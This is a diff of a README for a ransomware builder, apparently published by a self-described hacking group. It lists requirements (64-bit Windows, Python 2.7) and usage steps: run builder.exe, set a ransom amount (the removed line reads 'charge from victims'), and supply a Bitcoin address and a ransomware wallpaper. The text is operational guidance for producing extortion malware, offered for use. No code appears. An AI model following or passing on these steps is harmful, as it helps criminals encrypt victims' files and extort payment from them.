@@ -7,7 +7,9 @@
                 /_/                                                                                             
 we hack for india code for india die for india
 
-
+#requirement
+1.64 bit windows
+2.python2.7
 
 Contact us : https://www.facebook.com/script1337/
 
@@ -21,7 +23,7 @@ HOW TO USE
 
 4.Douable click on builder.exe 
 
-5.Enter the amount you want to charge from victims
+5.Enter the amount 
 
 Enter Bitcoin address background wallpaper (create a ransomware background wallpaper using ms paint or any other tool)
 
